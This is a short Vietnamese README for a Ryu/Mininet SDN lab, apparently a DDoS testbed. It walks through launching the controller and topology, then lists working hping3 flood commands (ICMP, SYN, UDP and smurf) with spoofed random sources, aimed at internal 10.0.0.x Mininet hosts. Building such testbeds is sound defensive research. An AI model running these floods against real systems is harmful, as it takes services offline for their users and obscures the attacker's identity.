<h1>Các bước chạy hệ thống</h1>

<h3>Khởi động Ryu Controller và vào thư mục chứa RyuController file controller.py</h3> 

```bash
#Kiểm tra IP
ifcongif
# Lưu IP để chuẩn bị sửa cho topology.py và vào thư mục RyuController
cd RyuController

# Chạy file controller.py
ryu-manager controller.py
```


<h3>Khởi động Mininet và vào thư mục Mininet chứa file topology.py</h3>

```bash
# Vào thư mục mininet
cd Mininet

# Chỉnh lại IP của Ryu Controller mà ta đã lưu trước đó
nano topology.py

# Chạy file topology.py
sudo python topology.py
```

<h3>Các lệnh ping</h3> 

```bash
# icmp flood
hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.12
```
```bash
# syn flood
hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.1
```
```bash
# udp flood
hping3 -2 -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.7
```
```bash
# smurf attack
hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood -a 10.0.0.17 10.0.0.17
```
